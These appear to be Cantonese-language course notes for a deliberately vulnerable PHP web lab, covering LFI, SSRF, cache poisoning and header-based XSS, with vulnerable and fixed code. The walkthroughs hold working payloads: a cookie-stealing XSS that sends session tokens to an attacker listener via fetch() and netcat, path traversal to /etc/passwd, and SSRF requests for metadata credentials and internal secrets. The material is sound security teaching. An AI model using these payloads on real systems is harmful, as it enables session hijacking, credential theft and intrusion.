> **圖示描述**：`includes/language.php` 嘅未渲染 source，顯示每種語言檔（`lang/en` 等）係一個 `return` 字串陣列嘅 PHP 檔，以及由 `$_GET['lang']` 直接拼入 `include(...)` 嘅 loader 兩行（原教材截圖，本筆記不轉載圖片）。

每個語言檔只係 return 一個翻譯字串陣列（回傳嘅陣列存喺 `$LANG`），所以頁面可以查 key（例如 `__('welcome')`）印出正確翻譯。**副檔名被省略，但 PHP 仍然會 parse 同執行該檔**——所以切換語言字面上就係「include 另一個 PHP 檔並執行佢入面任何 PHP 程式碼」。而因為用戶嘅 `lang` 值被**無驗證地拼入路徑**，佢根本唔需要係語言名：`../../` 呢類遍歷序列可以爬出 `lang/` 目錄，令 `include` 指向伺服器上任何可讀檔案。

#### 4.3.2 有漏洞寫法 vs 安全寫法（Vulnerable pattern vs. safe pattern）

原文提供咗兩個對照寫法，兩者都要一字不改咁記落嚟：

```php
// VULNERABLE: user input goes straight into the path
$lang = $_GET['lang'];
$strings = include("lang/" . $lang);
// ?lang=../../../../../../etc/passwd   reads arbitrary files
```

```php
// SAFE: allow-list map + basename() + realpath() check
$allowed = ['en' => 'lang/en', 'zh' => 'lang/zh', 'zht' => 'lang/zht'];
$lang = $_GET['lang'];
$lang = basename($lang);                // strip any directory components
if (!isset($allowed[$lang])) {
    $lang = 'en';                       // unknown language -> default
}
$path = realpath($allowed[$lang]);      // resolves to an absolute path
if ($path === false || strpos($path, realpath('lang')) !== 0) {
    die('Invalid language');            // defence in depth: must stay inside lang/
}
$strings = include $path;
```

> **圖示描述**：對照嘅安全寫法 source，顯示 `$allowed` allow-list map、`basename()` 剝目錄成份、`isset($allowed[$lang])` 白名單檢查、`realpath()` 解絕對路徑，同 `strpos($path, realpath('lang')) !== 0` 包含檢查，最後先 `include $path`（原教材截圖，本筆記不轉載圖片）。

**安全寫法點解安全**：allow-list map 令**只有三個固定路徑**可以被載入；`basename()` 把輸入嘅目錄成份剝走；`realpath()` 檢查確認解析出嚟嘅檔案真係住喺 `lang/` 入面。而在本 lab，language loader 用嘅係 `include ROOT_DIR . '/lang/' . $_GET['lang']`——**冇**允許語言清單、**冇**過濾遍歷序列、**冇**驗證副檔名。而且 `include` 會執行 PHP 檔，所以一個洩漏咗嘅備份 config 可以被當成程式碼執行。

- **OWASP 對應**：A01:2021 — Broken Access Control (path traversal / LFI)。
- **In the wild**：檔案包含類 bug 配合檔案上傳或 log poisoning，曾導致完整伺服器淪陷。
- **結論（原文）**：LFI 比單純讀檔危險，因為 PHP 嘅 `include` 會**執行**載入檔案內任何 PHP 程式碼。攻擊者慣常透過 log poisoning、PHP wrapper chains（`php://filter`、`phar://`）、session file inclusion、或上傳嘅臨時檔案，把 LFI 升級到 **remote code execution（RCE）**。**Remote File Inclusion (RFI)** 係相關變種，被包含嘅檔案係由外部 URL 載入。

#### 4.3.2b 安全寫法逐行對照

| 行 | 程式碼 | 作用 |
|---|---|---|
| 1 | `$allowed = ['en' => 'lang/en', ...]` | allow-list map，只有三個固定路徑可載入 |
| 2 | `$lang = basename($lang)` | 剝走目錄成份（`../../etc/passwd` → `passwd`） |
| 3 | `if (!isset($allowed[$lang])) $lang='en'` | 未知語言回落預設 |
| 4 | `$path = realpath($allowed[$lang])` | 解成絕對路徑，揭穿隱藏 `../` |
| 5 | `strpos($path, realpath('lang')) !== 0` | 確認解析後檔案仍在 `lang/` 內 |
| 6 | `include $path` | 只有通過以上檢查先執行 |

**本 lab 嘅實際寫法係**：`include ROOT_DIR . '/lang/' . $_GET['lang']`——無 allow-list、無遍歷過濾、無副檔名驗證，三樣都缺。

#### 4.3.3 如何發現（How to find it）

- **搵似會載入內容嘅 URL 參數**：例如 `?lang=`、`?page=`、`?file=`、`?include=`、`?template=`。
- **檢查語言切換連結、文件載入器、頁面選擇器**：睇 page source 了解參數值點樣被使用。
- **檢查有冇「直接拼入檔案路徑」而冇 allow-list、冇副檔名驗證、冇遍歷過濾**：直接拼接就係 flaw。
- **用目錄遍歷序列探測**：例如 `../../../../../../etc/passwd`，並比較 response body、長度、錯誤訊息。
- **若 response 出現已知系統檔或本地 source 檔**，loader 就係讀取任意檔案。

---

### 4.4 §14 Server-Side Request Forgery (SSRF)（原文 p.143–154）

**本節學習目標（原文）**：辨識 SSRF、迫使應用 fetch 雲端 metadata 同內部 API 資料、解釋為何要限制伺服器嘅 outbound request。

> **English Standard Definition:** Server-Side Request Forgery (SSRF) occurs when an application accepts a URL from the user and then fetches that URL from the server — because the request originates from the server, it inherits the server's network position and level of trust.

#### 4.4.1 係乜、為何有效（What is it and why does it work?）

SSRF 對應 **CWE-918**。因為 request 源自伺服器，佢會**繼承伺服器嘅網絡位置同信任級別**：可以觸及內部服務、雲端 metadata 端點、或者唔對互聯網開放嘅受限 admin interface。

**本 lab 有三個功能會 fetch 攻擊者控制嘅 URL**，伺服器用 `file_get_contents()` 攞 URL 再把 body 回畀用戶。因為冇允許目的地清單，攻擊者可以把參數指向：

- `/services.php` 上嘅 **Page Preview** 表單（下面首五步覆蓋）。
- `/pdf.php` 上嘅 **Report Export (beta)** 表單：fetch 一個 URL 再回傳成可下載 PDF——**同一個漏洞換頂帽**。
- `/imgproxy.php?url=...` 嘅 **image proxy**：fetch 再由用戶提供嘅 URL 重新派圖，用 image content type 洩漏 raw bytes。

以上每個都可以令你觸及 `/metadata.php` 嘅**模擬雲端 metadata 服務**（假 AWS 風格憑證同 user-data scripts），以及 `/internal/api.php` 嘅**模擬內部 micro-service**（service-account 密碼、資料庫憑證、內部配置）。

**為何 preview 類功能係 SSRF 頭號疑犯（原文）**：任何「代用戶發 request」嘅功能，都係攞用戶輸入直接當 outbound request 嘅目的地。伺服器通常坐喺受信任嘅網段（或者喺一部掛咗 metadata endpoint 嘅雲 VM 上），所以一條攻擊者永遠直接到唔到嘅 URL，透過伺服器就變得到可達——所以呢類頁面係 SSRF 攻擊鏈嘅天然起點。

#### 4.4.1b 本 lab 三個 SSRF 功能對照

| 功能 | 位置 | 底層 primitive | 輸出形式 |
|---|---|---|---|
| Page Preview (beta) | `/services.php`（`$_POST['preview_url']`） | `file_get_contents()` | 喺畫面顯示 |
| Report Export (beta) | `/pdf.php` | `file_get_contents()` | 包成可下載 PDF |
| Image proxy | `/imgproxy.php?url=...` | `file_get_contents()` | raw bytes ＋ image content type |

三者共用同一個 primitive，只係「戴唔同帽」；任一個都足以觸及 `/metadata.php` 同 `/internal/api.php`。

#### 4.4.2 審查網頁時點識別（How to identify such pages）

搵「值似 URL、IP 或路徑」嘅輸入欄、表單參數或 API 參數——`http://example.com` 呢類 placeholder 係鐵證。亦要留意 URL 入面嘅典型參數名：`?url=`、`?page=`、`?preview=`、`?feed=`、`?target=`、`?callback=`。如果你可以喺欄位打一個 IP 位址（例如 `127.0.0.1`）或內部 hostname，而伺服器回傳 fetch 到嘅內容，你已經搵到 SSRF injection point。Burp 嘅被動掃描同快速 site map 檢視參數名可以快速浮現呢啲點。

#### 4.4.3 `/services.php` 嘅真實漏洞程式碼（原文）

原文叫讀者逐行讀，並注意 `$_POST['preview_url']` **完全冇驗證**（可喺瀏覽器直接讀 `http://localhost:8080/services.php`，或 `view-source:http://localhost:8080/services.php` 睇未渲染版本）：

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['preview_url'])) {
    $ssrf_url = $_POST['preview_url'];
    // No allow-list or validation: the server fetches any URL the user supplies.
    $ssrf_result = @file_get_contents($ssrf_url);
    if ($ssrf_result === false) {
        $ssrf_result = 'Could not fetch URL: ' . htmlspecialchars($ssrf_url);
    }
}
```

> **圖示描述**：`/services.php` 嘅未渲染 source，顯示 `$_POST['preview_url']` 被直接複製到 `$ssrf_url`、再交畀 `@file_get_contents()`，整段完全冇 scheme／host／port 驗證（原教材截圖，本筆記不轉載圖片）。

**逐行解釋（原文）**：第一行只檢查係一個帶 `preview_url` 欄位嘅 POST。第二行把用戶輸入原封不動複製到 `$ssrf_url`，完全冇檢查。`file_get_contents()` 係一個讀檔入字串嘅 PHP 函數——但如果你畀佢 `http://`、`https://`、`file://` URL 而唔係本地路徑，PHP 會開一個網絡連線（或讀本地檔）並回傳整個 body 做字串。所以呢一行令伺服器 fetch 攻擊者打嘅任何 URL，存落 `$ssrf_result`，頁面再印返畀用戶。前面嘅 `@` 只係抑制 PHP warning——佢**唔會阻擋任何嘢**。最後個 `if` 只係 fetch 失敗時換一句友善錯誤訊息——程式**冇任何地方**驗證目的地嘅 scheme、host 或 port。

> ⚠️ 教材原文如此：本節嘅 `/services.php` 程式碼片段係節錄，開頭嗰行 `if (...) {` 對應嘅 `}` **冇喺原文片段出現**（原文只節錄關鍵幾行）；實際檔案係一個完整區塊。讀嘅時候唔好當佢係完整函數。

- **OWASP 對應**：A10:2021 — Server-Side Request Forgery。
- **In the wild**：SSRF 常用嚟觸及雲端 metadata 服務、內部 API、localhost admin panel。

**`/services.php` SSRF 程式碼逐行危險點（原文拆解）**

| 行 | 程式碼 | 危險點 |
|---|---|---|
| 1 | `if (... isset($_POST['preview_url']))` | 只檢查係帶參數嘅 POST，唔係驗證 |
| 2 | `$ssrf_url = $_POST['preview_url'];` | 原封不動複製用戶輸入 |
| 3 | `@file_get_contents($ssrf_url);` | 開網絡連線 fetch 任意 URL；`@` 只抑 warning |
| 4 | `if ($ssrf_result === false) ...` | 只換錯誤訊息，無 scheme／host／port 驗證 |

#### 4.4.4 常見 SSRF 目標同佢哋會洩漏咩（原文對照）

| SSRF target | Example URL | What sensitive data it can reveal |
|---|---|---|
| Cloud metadata (AWS) | `http://169.254.169.254/latest/meta-data/` | Instance identity, IAM role names and temporary credentials, user-data bootstrap scripts containing keys. |
| Cloud metadata (GCP) | `http://metadata.google.internal/` | Access tokens for the service account attached to the VM, project metadata, SSH keys. |
| Local config files (if `file://` wrapper is allowed) | `file:///etc/passwd`, `file:///var/www/html/config.php` | System user list, application source code, hard-coded database passwords and API keys. |
| Internal admin panels | `http://127.0.0.1:8080/admin/`, `http://192.168.x.x/` | Management interfaces with no external authentication, user lists, configuration toggles. |
| Loopback services (no auth by default) | Redis `127.0.0.1:6379`, Elasticsearch `127.0.0.1:9200` | Cached data, stored sessions, full database dumps via `KEYS *` / `_search` endpoints. |

#### 4.4.5 提示 SSRF 目標存在嘅發現特徵（Discovery signatures）

唔止雲端 metadata：審查或探測目標時，留意以下跡象，表示內部目的地值得攻擊：

- **內部 hostname 或私有 IP 出現喺 HTML 註釋、JavaScript 變數或錯誤訊息**（例如 `http://intranet.corp.local:8443`、`10.0.3.15`）。
- **fetch URL 失敗時，錯誤訊息洩漏內部 IP、開放 port 或服務 banner**（「Connection refused to 127.0.0.1:6379」就話你知 Redis 開緊）。
- **redirect 或被 fetch 嘅頁面引用更多內部連結**，SSRF 可跟住佢哋去測繪內部網絡。
- **似 port scan 嘅行為**：preview 功能對唔同 `host:port` 回傳唔同 response 長度或時間，令你能 fingerprint 內部服務。
- **link preview、import-from-URL、webhook tester 呢類應用功能**：功能本身嘅存在就係「伺服器會發可被你操控嘅 outbound request」嘅 signature。

---

## 🛠️ 5. 逐節實戰步驟（Try it yourself — Walkthrough）

> 全部步驟都係喺課程網站嘅 VM 靶場做，唔喺本機。凡 URL、header、payload 一律同原文**逐字一致**。每一步寫明：做乜 ➔ 喺邊度睇 ➔ 預期結果 ➔ 成功／失敗點分辨。

### 5.1 §5 Web Cache Poisoning Walkthrough（原文 p.69–72）

**步驟 1：載入頁面並搵出由 request header 砌成嘅連結（原文 p.69）**
- 做乜：喺 Firefox 打開 `http://localhost:8080/contact.php`，然後 View page source。
- 喺邊度睇：頁面底部嘅「Return to home」連結。
- 預期結果：嗰個連結係 `<a href="http://localhost:8080/index.php">`；`functions.php` 入面嘅 `get_base_url()` helper 由 `X-Forwarded-Host` request header 砌出嗰個 `href`——唔係由任何表單欄位。
- 成功／失敗點分辨：page source 見到「Return to home」嘅 `href` 係一個**絕對 URL**，其 hostname 由 request header 組裝而唔係打喺表單——呢個就係切入點。

> **圖示描述**：顯示 `http://localhost:8080/contact.php` 嘅 page source 畫面，重點標示頁底「Return to home」anchor，其 `href` 為 `http://localhost:8080/index.php`，並指出 hostname 部分係由 request header 組裝而成（原教材截圖，本筆記不轉載圖片）。

**步驟 2：清 cache，確保你嘅毒 response 會被儲存（原文 p.70）**
- 做乜：如果已經有舊 cache copy，你嘅惡意 request 可能覆蓋唔到佢。喺 Firefox 去 `http://localhost:8080/clear_cache.php` 保證有一個新 entry。
- 喺邊度睇：頁面。
- 預期結果：出現一個「Cache Cleared」頁面，確認 page cache 已清。
- 成功／失敗點分辨：見到「Cache Cleared」即成功；若果冇清，之後步驟可能 serve 返舊（未毒）entry。

**步驟 3：截取 request，用 canary 確認 unkeyed input（原文 p.70）**
- 做乜：Burp proxy 開住（見 §0.3），用 Firefox 去 `/contact.php`。喺 Burp 嘅 Proxy > HTTP history，右鍵 `GET /contact.php`，揀 Send to Repeater。喺 Repeater tab 加：
```
X-Forwarded-Host: hkiitcanary1234
```
- 喺邊度睇：response body 搜尋 canary。
- 預期結果：response 嘅「Return to home」連結變成 `http://hkiitcanary1234/index.php`——header 值被反射入 HTML，證明佢係 unkeyed input。
- 成功／失敗點分辨：見到 canary 出現喺連結 hostname 即係 unkeyed；若 canary 唔出現，header 可能被 proxy 剝走或冇被使用。

> **圖示描述**：Burp Repeater 畫面，request 帶 `X-Forwarded-Host: hkiitcanary1234`，response body 內「Return to home」連結顯示為 `http://hkiitcanary1234/index.php`（原教材截圖，本筆記不轉載圖片）。

**步驟 4：用惡意 host 污染 cache（原文 p.71）**
- 做乜：喺 Repeater tab，把 header 值改成：
```
X-Forwarded-Host: evil.example.com
```
- 喺邊度睇：response。
- 預期結果：按 Send 後，「Return to home」連結變成 `http://evil.example.com/index.php`。因為 cache key 忽略該 header，呢份有毒 response 而家被儲存喺正常 URL `/contact.php` 底下。
- 成功／失敗點分辨：連結 hostname 變 `evil.example.com` 即污染成功。

> **圖示描述**：Burp Repeater 內 response，「Return to home」連結已變為 `http://evil.example.com/index.php`（原教材截圖，本筆記不轉載圖片）。

**步驟 5：唔帶 header 請求頁面，觀察毒連結（原文 p.72）**
- 做乜：喺 Firefox 開一個新 private window（Ctrl+Shift+P，或 File > New Private Window）令冇瀏覽器 cache 干擾，去 `http://localhost:8080/contact.php`——正常訪客唔會送 `X-Forwarded-Host` header。
- 喺邊度睇：View page source。
- 預期結果：「Return to home」連結**仍然**指向 `http://evil.example.com/index.php`。cache 把攻擊者控制嘅副本派咗畀一個全新訪客。
- 成功／失敗點分辨：全新 session 冇 header 都見到毒連結 = cache 真係中招。

> **圖示描述**：新 private window 內 `/contact.php` 嘅 page source，「Return to home」連結仍然係 `http://evil.example.com/index.php`，證明 cache 派咗毒版本（原教材截圖，本筆記不轉載圖片）。

**原文結論**：cache key 淨係 `md5($_SERVER['REQUEST_URI'])`。response body 取決於 `X-Forwarded-Host`，而佢係 unkeyed input，所以一條惡意 request 就污染咗全部之後訪客嘅 cache 頁面。

### 5.2 §7 Reflected XSS via HTTP Header Walkthrough（原文 p.90–95）

> 以下全部 payload 都以 `X-Username` header、喺一個普通 `GET /index.php` request 送出。喺 Burp Repeater 把 payload 貼成 header 值；lab 工具 `tools/xss_header.py` 亦可以幫你送。反射**只喺未登入時**出現。

**步驟 1：確認 `/index.php` 反射 `X-Username` header（原文 p.90）**
- 做乜：喺 Burp Repeater 砌一個 `GET /index.php` request，加 `X-Username: CANARY_TEST_123`，送出。然後右鍵揀 Request in browser，把產生嘅 URL 貼入 Firefox（或 `python3 tools/xss_header.py`，佢會自行發 canary payload 並報告每個反射）。
- 喺邊度睇：banner 下面嘅問候語行。
- 預期結果：問候語讀「visitor, CANARY_TEST_123」，canary 未變咁渲染喺 `span id="user-greeting"` 元素入面。
- 成功／失敗點分辨：canary 原封不動出現 = 反射點成立。

> **圖示描述**：頁面 banner 下問候語行顯示「visitor, CANARY_TEST_123」，canary 未經轉義地渲染喺 `span id="user-greeting"` 內（原教材截圖，本筆記不轉載圖片）。

**步驟 2：注入 `<script>` tag（原文 p.91）**
- 做乜：送以下 header：
```
X-Username: <script>document.body.style.border='12px solid red'</script>
```
- 喺邊度睇：頁面渲染。
- 預期結果：script 執行，喺整頁四周畫一條粗紅邊框——無害但鐵證 JavaScript 執行過。
- 成功／失敗點分辨：見到粗紅框 = 執行成功。

> **圖示描述**：整頁被一條粗紅邊框包圍，證明注入嘅 script 執行過（原教材截圖，本筆記不轉載圖片）。

**步驟 3：注入帶 error handler 嘅 `<img>` tag（原文 p.92）**
- 做乜：唔係每個反射點都容許 `script` tag，所以用其他 tag 嘅 event handler。送：
```
X-Username: <img src=x onerror="this.outerHTML='<mark>XSS via img onerror</mark>'">
```
- 喺邊度睇：頁面。
- 預期結果：瀏覽器嘗試載入圖片 `x` 失敗，觸發 `onerror` handler，把問候語換成一個 highlight 標記——「XSS via img onerror」文字被渲染喺頁面。
- 成功／失敗點分辨：見到「XSS via img onerror」標記 = 成功。

> **圖示描述**：問候語位置顯示 highlight 標記「XSS via img onerror」（原教材截圖，本筆記不轉載圖片）。

**步驟 4：注入 SVG load handler（原文 p.92）**
- 做乜：`onload` 喺元素載入完成時觸發。`<body onload=...>` 喺現存 `<span>` 入面唔 work，但 SVG 元素會，因為佢喺該處被 parse 同載入。送：
```
X-Username: <svg onload="this.outerHTML='<mark>XSS via svg onload</mark>'"></svg>
```
- 喺邊度睇：頁面。
- 預期結果：SVG 即刻載入，`onload` handler 執行——「XSS via svg onload」標記出現。
- 成功／失敗點分辨：見到 SVG 標記 = 成功；證明攻擊者可以用任何能觸發 load event 嘅 tag。

> **圖示描述**：頁面顯示 highlight 標記「XSS via svg onload」（原教材截圖，本筆記不轉載圖片）。

**步驟 5：偷 session cookie 並顯示（原文 p.93）**
- 做乜：以上 payload 只證明執行；同一個 `onerror` handler 可以讀 `document.cookie`（受害者 session token）再寫入頁面。送：
```
X-Username: <img src=x onerror="this.outerHTML='<mark>Stolen cookie: '+document.cookie+'</mark>'">
```
- 喺邊度睇：問候語。
- 預期結果：問候語顯示你嘅真實 session，例如「Stolen cookie: PHPSESSID=rqle8gsjg2u2ilin7qkg34ujas; lang=en」——受害者瀏覽器 `document.cookie` 內任何嘢（包括 session ID）都被顯示，可被攻擊者 JavaScript 讀取。
- 成功／失敗點分辨：見到自己嘅 `PHPSESSID` = 成功偷到。

> **圖示描述**：問候語顯示「Stolen cookie: PHPSESSID=…; lang=en」，把受害者 session token 印出嚟（原教材截圖，本筆記不轉載圖片）。

**步驟 6：把 cookie 外傳去攻擊者控制嘅伺服器（原文 p.94）**
- 做乜：顯示 cookie 只證明有 access；真實攻擊會送佢去攻擊者控制嘅伺服器。喺 Kali 攻擊機開監聽：
```
nc -lvnp 8088
```
然後送一個 handler 把 cookie POST 去嗰個 listener，並把自己嘅 IP 代入去（用 `ip a` 搵 host IP；喺 VirtualBox host-only 網絡通常係 `192.168.56.1`）：
```
X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURIComponent(document.cookie))">
```
- 喺邊度睇：netcat 終端。
- 預期結果：你會見到一條 request 例如 `GET /?c=PHPSESSID%3Dabc123 HTTP/1.1`——session token 已經離開受害者瀏覽器。
- 成功／失敗點分辨：netcat 見到 request = 外傳成功。

> **圖示描述**：netcat 終端顯示 `GET /?c=PHPSESSID%3Dabc123 HTTP/1.1` 請求，證明 cookie 已外傳（原教材截圖，本筆記不轉載圖片）。

- 本 lab 冇外部攻擊主機，所以同一概念會對 lab 自己嘅 leak endpoint 示範：
```
X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">
```
- 預期結果：`fetch()` 把 cookie 送去 collector，marker 確認外傳已觸發——netcat 顯示 `GET /?c=PHPSESSID%3D…`，或者（用 lab endpoint 時）出現「Cookie exfiltrated to attacker server」標記。**呢一步就係把 XSS 變成帳號接管嘅關鍵**：有咗偷到嘅 `PHPSESSID`，你就可以冒充受害者（§13 更會把喺本 lab 備份檔搵到嘅 secret 鏈去完整帳號接管——該部分見 ART_T3_04）。

> **圖示描述**：頁面顯示 highlight 標記「Cookie exfiltrated to attacker server」，確認外傳觸發（原教材截圖，本筆記不轉載圖片）。

> ⚠️ 教材原文如此：本節步驟截圖編號出現跳號——步驟 6 先引用 **Screenshot 97**（netcat 畫面），再引用 **Screenshot 58**（lab marker）；即 58 理應早於 97，但原文喺此處逆序使用。呢個係原文截圖編號跳號（原文 §0 已知「Screenshot 01–110，號碼有跳」），非筆記錯誤。

**原文結論**：應用把 header 值 echo 入問候語 `span` 而毫無編碼（見 `index.php` 嘅 `echo $_SERVER['HTTP_X_USERNAME']`）。因為反射喺元素內容而唔喺屬性或者 JavaScript 字串入面，攻擊者可以引入全新 tag 同 event handler，瀏覽器以網站完整權限執行佢哋。

### 5.3 §10 LFI via Language Loader Walkthrough（原文 p.116–118）

**步驟 1：識別語言切換參數（原文 p.116）**
- 做乜：睇任何頁面頂部：`繁體中文`／`简体中文`／`English` 連結分別指向 `?lang=zht`、`?lang=zh`、`?lang=en`。右鍵 View page source，搜尋 `?lang=` 確認。
- 喺邊度睇：頂部語言連結、page source。
- 預期結果：page source 見到語言連結帶 `?lang=`；撳其中一個會把整頁重渲染成該語言。
- 成功／失敗點分辨：見到 `?lang=` 帶唔同值 = 起點成立。

> **圖示描述**：選擇 `?lang=zh` 後網站以簡體中文渲染，顯示頂部語言切換連結（原教材截圖，本筆記不轉載圖片）。

**步驟 2：用已知系統檔確認 path traversal（原文 p.117）**
- 做乜：`/etc/passwd` 係一個安全、唯讀、幾乎每部 Linux 伺服器都有嘅檔。若果應用回傳佢嘅內容，你就證明咗參數被無驗證拼入檔案路徑、而且你可以爬出預定目錄。喺 Firefox 地址欄改成：
```
http://localhost:8080/index.php?lang=../../../../../../etc/passwd
```
然後按 Enter。
- 喺邊度睇：response 頂部。
- 預期結果：因為 include 喺頁面仲組裝緊時就執行，檔案內容會印喺 response **最頂**，喺網站 header 同 layout 之前——你會見到 raw `root:x:0:0:root:/root:/bin/bash` 一行同所有系統帳號，喺正常頁面之上。
- 成功／失敗點分辨：見到 `/etc/passwd` 內容 = 任意檔案讀取成立。

> **圖示描述**：`/etc/passwd` 內容（`root:x:0:0:…` 等系統帳號）印喺正常頁面頂部、網站 header 之前（原教材截圖，本筆記不轉載圖片）。

**步驟 3：讀取之前發現嘅應用檔案（原文 p.118）**
- 做乜：喺備份檔爆破（§9）階段我哋搵到 `/backup/config.php.bak`。因為 LFI loader 坐喺 web root，用 `../` 上一層就到 backup folder。去：
```
http://localhost:8080/index.php?lang=../backup/config.php.bak
```
- 喺邊度睇：右鍵 response 揀 View page source。
- 預期結果：backup config 嘅 PHP source 出現喺正常頁面 HTML 之前。
- 成功／失敗點分辨：見到 config 檔 source = 成功讀到應用檔案。

**原文提醒**：記住 `include` 會**執行**檔案——檔案系統上任何**可寫**嘅 PHP 檔（上傳功能、session 檔、log poisoning）都會把呢個 LFI 變成 **remote code execution**。

**原文 Recap**：path 係以 `ROOT_DIR . '/lang/' . $_GET['lang']` 直接拼接而成，冇 allow-list、冇遍歷過濾，所以目錄遍歷可以載入任意可讀檔案。

> ⚠️ 教材原文如此：LFI 一節內，「How to fix (for defenders)」段落（原文 p.114）出現喺「How to find it」段落（p.115）**之前**，即防守修法先講、發現方法後講，次序同其他節唔一致。呢個係原文編排，非筆記誤植。

### 5.4 §14 SSRF Walkthrough（原文 p.148–153）

**步驟 1：定位 URL-fetching 功能（原文 p.148）**
- 做乜：喺 Firefox 打開 `/services.php`，捲到 Page Preview (beta) 表單。
- 喺邊度睇：表單。
- 預期結果：表單顯示一個文字欄，要求一個 preview 用嘅 URL——呢個就係 SSRF injection point。
- 成功／失敗點分辨：見到要求 URL 嘅欄位 = 起點成立。

> **圖示描述**：`/services.php` 頁面上「Page Preview (beta)」表單，只有一個要求輸入 URL 嘅文字欄（原教材截圖，本筆記不轉載圖片）。

**步驟 2：確認伺服器會發 outbound request（原文 p.149）**
- 做乜：提交一個你控制嘅 URL，例如你嘅 Burp Collaborator 子域名或本地 netcat listener。
- 喺邊度睇：你嘅 listener。
- 預期結果：listener 收到 hit，確認功能係由伺服器端 fetch URL。你亦可以提交 `http://localhost:8080/index.php`：preview 區顯示由伺服器 fetch 返嚟嘅 lab 首頁。
- 成功／失敗點分辨：listener 有 hit，或 preview 顯示 lab 首頁 = 確認 SSRF。

> **圖示描述**：Page Preview 區顯示由伺服器 fetch 返嚟嘅 lab 首頁內容（提交 `http://localhost:8080/index.php` 之後）（原教材截圖，本筆記不轉載圖片）。

**步驟 3：查詢模擬雲端 metadata 服務（原文 p.150）**
- 做乜：提交以下 URL 並讀 response：
```
http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole
```
- 喺邊度睇：preview 區 response。
- 預期結果：喺真實雲 VM 端點會係 `http://169.254.169.254/...`，憑證會係真實雲憑證；本 lab 回傳假 AWS 憑證——Access Key ID、Secret Access Key、session token。
- 成功／失敗點分辨：見到三件憑證 = 成功讀到 metadata。亦可試其他路徑如 `latest/meta-data/instance-id`、`latest/meta-data/local-ipv4`、`latest/user-data` 睇攻擊者可枚舉咩。
- **原文實測 URL（一字不改）**：
```
http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole
```

> **圖示描述**：response 顯示假 AWS 憑證，包括 Access Key ID、Secret Access Key 同 session token（原教材截圖，本筆記不轉載圖片）。

**步驟 4：查詢模擬內部 API 拎 secrets（原文 p.150）**
- 做乜：提交以下 URL：
```
http://localhost:8080/internal/api.php?endpoint=secrets
```
- 喺邊度睇：response。
- 預期結果：response 含 SMTP 密碼、API gateway key、VPN pre-shared key、內部資料庫憑證——本應永遠唔可以由公網觸及嘅 secrets。
- 成功／失敗點分辨：見到上述 secrets = 成功。

> **圖示描述**：response 顯示內部 API 嘅 secrets，包括 SMTP 密碼、API gateway key、VPN pre-shared key 同資料庫憑證（原教材截圖，本筆記不轉載圖片）。

**步驟 5：枚舉內部 service accounts（原文 p.151）**
- 做乜：提交：
```
http://localhost:8080/internal/api.php?endpoint=users
```
- 喺邊度睇：response。
- 預期結果：response 列出內部 service accounts，含明文密碼同角色描述——可用嚟 pivot 去其他內部系統。
- 成功／失敗點分辨：見到帳號明文密碼 = 成功。

> **圖示描述**：response 列出內部 service accounts 連明文密碼同角色描述（原教材截圖，本筆記不轉載圖片）。

**步驟 6：定位 PDF report generator（原文 p.152）**
- 做乜：喺 Firefox 打開 `/pdf.php`。Report Export (beta) 表單要求一個 document URL，並把頁面轉成可下載 PDF。
- 喺邊度睇：表單。
- 預期結果：背後伺服器用 `file_get_contents()` fetch 嗰個 URL——同 Page Preview 一樣嘅 primitive，只係結果包成 PDF 而唔係喺畫面顯示。表單顯示一個文字欄要求要 export 嘅文件 URL。
- 成功／失敗點分辨：見到要求 Document URL 嘅欄 = 起點成立。

> **圖示描述**：`/pdf.php` 頁面「Report Export (beta)」表單，只有一個要求輸入文件 URL 嘅文字欄（原教材截圖，本筆記不轉載圖片）。

**步驟 7：透過 PDF generator 偷內部 secrets（原文 p.152）**
- 做乜：喺 Document URL 欄，提交內部 API secrets 端點：
```
http://localhost:8080/internal/api.php?endpoint=secrets
```
- 喺邊度睇：下載嘅 PDF。
- 預期結果：伺服器 fetch 內部 API 嘅 JSON，存落生成嘅 PDF。下載並打開——`report.pdf` 含有內部 SMTP 密碼、API gateway key、VPN pre-shared key、資料庫憑證：證明「包裹成檔案」嘅 export 同畫面 preview 一樣咁易洩漏 SSRF 資料。
- 成功／失敗點分辨：PDF 內見到內部 secrets = 成功。

> **圖示描述**：下載嘅 `report.pdf` 內含內部 SMTP 密碼、API gateway key、VPN pre-shared key 同資料庫憑證（原教材截圖，本筆記不轉載圖片）。

**步驟 8：定位 image proxy（原文 p.153）**
- 做乜：喺 Firefox 打開 `/imgproxy.php`。頁面解釋佢由伺服器端 fetch 遠端圖片以優化，並顯示指向 `/imgproxy.php?url=...` 嘅範例 `img` tag。
- 喺邊度睇：頁面。
- 預期結果：按需 fetch 遠端圖片係另一個經典 SSRF injection point，因為 `url` 參數嘅 URL 由伺服器 fetch，raw bytes 回畀瀏覽器——demo 頁會載入範例 proxied images。
- 成功／失敗點分辨：見到範例圖片 = demo 頁正常載入，可開始濫用。

> **圖示描述**：`/imgproxy.php` demo 頁載入範例 proxied images，並展示指向 `/imgproxy.php?url=...` 嘅 `img` tag（原教材截圖，本筆記不轉載圖片）。

**步驟 9：用 image proxy 讀本地檔案（原文 p.153）**
- 做乜：image proxy 通常把 fetch 到嘅 bytes 直接 pass through，所以佢可以 re-serve 多過圖片。用一個 `file://` URL 請求 image proxy 並讀 response body（用 `curl` 令 raw bytes 可見）：
```
curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"
```
- 喺邊度睇：curl output。
- 預期結果：proxy 由伺服器檔案系統 fetch 本地檔再連 image content type 回傳內容——image proxy 變成**任意檔案讀取器**。
- 成功／失敗點分辨：見到 `/etc/passwd` 內容 = 成功。同一個技巧對 `http://localhost:8080/internal/api.php?endpoint=secrets` 或 `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` 一樣可以洩漏內部資料，透過一個本應只係用嚟縮圖嘅頁面。

> **圖示描述**：image proxy 回傳本地檔內容，證明佢已變成任意檔案讀取器（原教材截圖，本筆記不轉載圖片）。

**§14 原文實測 URL 一覽（全部一字不改）**

| 用途 | 原文 URL |
|---|---|
| Page Preview 表單 | `http://localhost:8080/services.php` |
| 確認 outbound（localhost 測試） | `http://localhost:8080/index.php` |
